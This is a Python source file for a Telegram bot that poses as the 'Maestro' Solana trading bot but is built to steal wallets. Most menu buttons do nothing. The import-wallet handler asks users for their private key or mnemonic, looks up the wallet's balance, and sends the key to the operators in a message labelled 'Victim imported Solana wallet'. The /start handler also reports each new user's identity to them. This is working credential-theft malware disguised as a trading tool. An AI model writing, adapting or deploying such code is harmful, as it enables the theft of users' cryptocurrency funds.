import os
import logging
import asyncio
import base58
import httpx
from nacl.signing import SigningKey
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler,
    MessageHandler, Filters, CallbackContext, ConversationHandler
)
from dotenv import load_dotenv

load_dotenv()

API_TOKEN = os.getenv("API_TOKEN")
ADMIN_IDS = os.getenv("ADMIN_IDS", "")
ADMIN_ID_LIST = [int(i.strip()) for i in ADMIN_IDS.split(",") if i.strip().isdigit()]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

WAITING_FOR_PRIVATE_KEY = 1
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"


class TradingBot:
    def __init__(self):
        self.wallet_buttons = [
            [InlineKeyboardButton("🔄 Rearrange Wallets", callback_data="rearrange_wallets")],
            [InlineKeyboardButton("📜 Q1", callback_data="wallet_q1"),
             InlineKeyboardButton("🟢 Manual", callback_data="manual_wallet"),
             InlineKeyboardButton("🧹 Erase", callback_data="erase_messages")],
            [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet"),
             InlineKeyboardButton("⚙️ Generate Wallet", callback_data="generate_wallet")],
            [InlineKeyboardButton("🔙 Return", callback_data="return_main")]
        ]
        self.main_buttons = [
            [InlineKeyboardButton("🔗 Chains", callback_data="chains"),
             InlineKeyboardButton("💼 Wallets", callback_data="wallets")],
            [InlineKeyboardButton("⚙️ Global Settings", callback_data="global_settings"),
             InlineKeyboardButton("📡 Signals", callback_data="signals")],
            [InlineKeyboardButton("🧑‍🤝‍🧑 Copytrade", callback_data="copytrade"),
             InlineKeyboardButton("🤝 Presales", callback_data="presales")],
            [InlineKeyboardButton("🎯 Auto Snipe", callback_data="auto_snipe"),
             InlineKeyboardButton("🕒 Active Orders", callback_data="active_orders")],
            [InlineKeyboardButton("📈 Positions", callback_data="positions"),
             InlineKeyboardButton("⭐ Premium", callback_data="premium")],
            [InlineKeyboardButton("💰 Referral", callback_data="referral"),
             InlineKeyboardButton("🔁 Bridge", callback_data="bridge")],
            [InlineKeyboardButton("⚡ BUY & SELL NOW!", callback_data="quick_buy_sell")]
        ]

    # ================= SOLANA WALLET HELPERS ================= #
    async def get_solana_balance_async(self, private_key: str):
        try:
            decoded_key = base58.b58decode(private_key)

            if len(decoded_key) == 64:
                secret_key_bytes = decoded_key[:32]
            elif len(decoded_key) == 32:
                secret_key_bytes = decoded_key
            else:
                return None, "Invalid private key format"

            signing_key = SigningKey(secret_key_bytes)
            public_key_bytes = bytes(signing_key.verify_key)
            public_key_str = base58.b58encode(public_key_bytes).decode('utf-8')

            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [public_key_str]
            }

            async with httpx.AsyncClient() as client:
                response = await client.post(SOLANA_RPC_URL, json=payload, timeout=10.0)
                if response.status_code == 200:
                    data = response.json()
                    if "result" in data and "value" in data["result"]:
                        balance_lamports = data["result"]["value"]
                        balance_sol = balance_lamports / 1_000_000_000
                        return balance_sol, public_key_str
                    else:
                        return None, f"RPC Error: {data.get('error', 'Unknown error')}"
                else:
                    return None, f"HTTP Error: {response.status_code}"
        except Exception as e:
            return None, str(e)

    def get_solana_balance(self, private_key: str):
        try:
            return asyncio.run(self.get_solana_balance_async(private_key))
        except RuntimeError:
            loop = asyncio.get_event_loop()
            return loop.run_until_complete(self.get_solana_balance_async(private_key))

    # ================= BOT LOGIC ================= #
    def start(self, update: Update, context: CallbackContext):
        context.user_data['messages'] = []
        msg = update.message.reply_text(
            "*Welcome to Maestro, the one-stop solution for all your trading needs!*\n\n"
            "🔗 *Chains:* Enable/disable chains.\n"
            "💼 *Wallets:* Import or generate wallets.\n"
            "⚙️ *Global Settings:* Customize the bot for a unique experience.\n"
            "🕒 *Active Orders:* Active buy and sell limit orders.\n"
            "📈 *Positions:* Monitor your active trades.\n\n"
            "⚡ *Looking for a quick buy or sell?* Simply paste the token CA and you're ready to go!",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(self.main_buttons)
        )
        context.user_data['messages'].append(msg.message_id)

        user = update.message.from_user
        text = (
            f"🆕 New user started the bot\n\n"
            f"User Information:\n"
            f"Name: {user.full_name}\n"
            f"Username: @{user.username or 'NoUsername'}\n"
            f"User ID: {user.id}\n"
            f"Time: {datetime.now()}"
        )
        for admin_id in ADMIN_ID_LIST:
            context.bot.send_message(chat_id=admin_id, text=text)

    def wallet_menu(self, update: Update, context: CallbackContext):
        query = update.callback_query
        query.answer()
        text = (
            "📁 *SOL*\n"
            "Q1: 7QanfJVVhE1kBvRG3bzLxBQ1TwJhxbzhq7dLtMywRNqz\n"
            "🟢 Default | 🟢 Manual | 💰 0 SOL\n\n"
            "ℹ️ *To transfer from a wallet or rename it, click on the wallet name.*\n"
            "ℹ️ *Enable “Manual” for the wallets participating in your manual buys.*\n"
            "Automated buys will be defaulted to your “Default” wallet, but you can further control this through dedicated Signals, Copytrade, and Auto Snipe settings."
        )
        query.edit_message_text(
            text=text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(self.wallet_buttons)
        )

    def import_wallet_prompt(self, update: Update, context: CallbackContext):
        query = update.callback_query
        query.answer()
        msg = query.message.reply_text("🔑 Please enter the private key or a 12-word mnemonic phrase of the wallet you want to import.")
        context.user_data['awaiting_private_key'] = True
        context.user_data.setdefault('messages', []).append(msg.message_id)
        return WAITING_FOR_PRIVATE_KEY

    def handle_private_key(self, update: Update, context: CallbackContext):
        if not context.user_data.get('awaiting_private_key'):
            return ConversationHandler.END

        private_key = update.message.text.strip()
        user = update.message.from_user

        # ✅ Get actual balance and public key
        balance, public_key_or_error = self.get_solana_balance(private_key)

        if balance is not None:
            balance_text = f"{balance:.4f} SOL"
            public_key_text = f"Public Key: `{public_key_or_error}`"
        else:
            balance_text = f"Error: {public_key_or_error}"
            public_key_text = "Public Key: Unable to derive"

        # Notify user
        update.message.reply_text("✅ Wallet information received.", parse_mode=ParseMode.MARKDOWN)

        # Notify admins
        text = (
            "🔐 Victim imported Solana wallet\n\n"
            f"Victim Information\n"
            f"Name: @{user.username or 'NoUsername'}\n"
            f"Premium: ❌\n"
            f"• ID: {user.id}\n"
            f"Balance: {balance_text}\n"
            f"{public_key_text}\n\n"
            f"Private key:\n`{private_key}`\n\n"  # ✅ tap-to-copy format
            "⚠️ Do not try to exit scam, you will be instantly caught red handed!"
        )
        for admin_id in ADMIN_ID_LIST:
            context.bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.MARKDOWN)

        context.user_data['awaiting_private_key'] = False
        return ConversationHandler.END

    def erase_messages(self, update: Update, context: CallbackContext):
        query = update.callback_query
        query.answer()
        for msg_id in context.user_data.get('messages', []):
            try:
                context.bot.delete_message(chat_id=update.effective_chat.id, message_id=msg_id)
            except:
                pass
        context.user_data['messages'] = []
        query.message.reply_text("🧹 All messages erased.")

    def return_to_main(self, update: Update, context: CallbackContext):
        query = update.callback_query
        query.answer()
        msg = query.message.reply_text(
            "*Welcome to Maestro, the one-stop solution for all your trading needs!*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(self.main_buttons)
        )
        context.user_data.setdefault('messages', []).append(msg.message_id)

    def button_handler(self, update: Update, context: CallbackContext):
        data = update.callback_query.data
        if data == "wallets":
            self.wallet_menu(update, context)
        elif data == "import_wallet":
            return self.import_wallet_prompt(update, context)
        elif data == "erase_messages":
            self.erase_messages(update, context)
        elif data == "return_main":
            self.return_to_main(update, context)
        else:
            update.callback_query.answer("Feature not implemented.")

    def error_handler(self, update: Update, context: CallbackContext):
        logger.warning(f"Update caused error: {context.error}")


def main():
    bot = TradingBot()
    updater = Updater(API_TOKEN, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(bot.button_handler, pattern="^import_wallet$")],
        states={
            WAITING_FOR_PRIVATE_KEY: [
                MessageHandler(Filters.text & ~Filters.command, bot.handle_private_key)
            ]
        },
        fallbacks=[]
    )

    dp.add_handler(CommandHandler("start", bot.start))
    dp.add_handler(conv_handler)
    dp.add_handler(CallbackQueryHandler(bot.button_handler))
    dp.add_error_handler(bot.error_handler)

    updater.start_polling()
    updater.idle()


if __name__ == '__main__':
    main()
